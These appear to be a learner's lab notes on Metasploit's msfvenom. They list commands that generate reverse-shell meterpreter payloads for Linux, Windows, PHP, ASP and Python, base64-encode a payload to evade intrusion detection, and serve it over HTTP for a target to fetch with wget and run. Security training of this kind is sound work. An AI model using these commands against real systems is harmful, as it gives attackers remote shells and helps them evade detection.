## msfconsole: To generate the payloads
- `msfvenom - a Metasploit standalone payload generator.`
- Msfvenom, which replaced Msfpayload and Msfencode, allows you to generate payloads.
- Msfvenom will allow you to access all payloads available in the Metasploit framework. 
- Msfvenom allows you to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.).
- ` msfvenom --list` formats command can be used to list supported output formats.

## Encoder: 
- Can be use by msfvenom, `encode transforms the byte pattern, file format etc of Payload` used to avoid detection by IDS/IPS.
- eg: `msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.x.x -f raw -e php/base64`
- with the `-e parameter. The PHP version of Meterpreter was encoded in Base64` 

## Handlers: (Listener)
- Similar to exploits using a reverse shell, you will need to be able to accept incoming connections generated by the MSFvenom payload.
- use **exploit/multi/handler** to receive the incoming connection.
- MSFvenom will require a payload, the local machine IP address, and the local port to which the payload will connect.

## Other Payloads:
- Linux Executable and Linkable Format (elf) (Change Permission chmod +x shell.elf &  run this file by typing ./shell.elf)
> msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
- Windows
> msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
- PHP (Remove php comments to make file executable)
> msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
- ASP
> msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
- Python
> msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py

### Note: All of the examples above are reverse payloads. This means we need to have the exploit/multi/handler module listening on attacking/local machine to work as a handler, need to set up the handler accordingly with the payload, LHOST and LPORT parameters. These values will be the same we have used when creating the msfvenom payload.

## Task1: Create Payload, Transfer to Target VM, Get Meterpreter
- Do ssh to Target VM > ssh username@targetVM_IP > sudo su
- Create Payload on Local VM > msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
- Transfer the payload to Target VM > 
- - a. First Create a server on Local VM > python3 -m http.server 9000 (change permission of file eg. chmod 777 file_name)
- - b. Use on Target VM terminal or in ssh session wget http://LocalVM_IP/file_name.format
- Get a meterpreter session on the target machine > 
- - a. Start the Metasploit handler before executing the transfered payload on target VM: use exploit/multi/handler
- - b. set payloads(Specific to Linux), lhost, lport (check show option) (Use same lport, lhost what used while creating payload)
- - c. run > meterpreter session must have started after executing the "transfered payload" on target VM
  - d. we can switch to other session with `session`

 
